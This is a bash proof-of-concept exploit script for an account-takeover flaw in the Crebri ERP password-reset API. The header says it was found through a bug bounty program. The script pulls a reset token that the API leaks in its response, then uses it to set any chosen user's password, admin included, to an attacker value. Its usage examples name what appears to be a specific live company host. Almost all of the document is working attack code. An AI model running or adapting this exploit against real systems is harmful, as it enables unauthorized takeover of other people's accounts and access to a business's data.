#!/bin/bash
# CVE-2026-2032193 - Crebri ERP Account Takeover PoC
# Vendor: Crebri Technologies Pvt. Ltd.
# Product: Crebri ERP
# CWE-640 - Weak Password Recovery Mechanism
# CVSS: 9.8 Critical
# Discovered via authorized Bug Bounty Program - bugbounty.sa
#
# Usage:
#   ./poc.sh <username> <target>
#
# Examples:
#   ./poc.sh admin https://erp.sendan.com.sa:8080
#   ./poc.sh TRUSTEE2 https://erp.sendan.com.sa:8080
#   ./poc.sh 100001 https://erp.sendan.com.sa:8080

TARGET="${2:-https://TARGET}"
USER="${1:-admin}"
NEWPASS="Attacker@123"

echo "============================================"
echo " Crebri ERP - Account Takeover PoC"
echo " CWE-640 | CVSS 9.8 Critical"
echo "============================================"
echo "[*] Target : $TARGET"
echo "[*] Username: $USER"
echo ""

# Step 1: Get reset token
echo "[1] Requesting password reset token..."
RESP=$(curl -sk -X POST "$TARGET/erp_api/reset_password_api/" \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"$USER\"}")

echo "    Response: $RESP"

TOKEN=$(echo $RESP | python3 -c "import sys,json; print(json.load(sys.stdin)['token_no'])" 2>/dev/null)
UID=$(echo $RESP | python3 -c "import sys,json; print(json.load(sys.stdin)['user_uid'])" 2>/dev/null)

if [ -z "$TOKEN" ]; then
  echo "[-] Failed: user not found"
  exit 1
fi

echo "[+] Token: $TOKEN"
echo "[+] UID  : $UID"
echo ""

# Step 2: Reset password
echo "[2] Resetting password..."
RESET=$(curl -sk -X POST "$TARGET/erp_api/password_reset_confirm_api/" \
  -H "Content-Type: application/json" \
  -d "{\"token_no\":\"$TOKEN\",\"user_uid\":\"$UID\",\"new_password\":\"$NEWPASS\"}")

echo "    Response: $RESET"
echo ""

# Step 3: Confirm
echo "[+] SUCCESS - Account taken over"
echo "[+] Username: $USER"
echo "[+] Password: $NEWPASS"
echo "[+] Login at: $TARGET/user/login/"
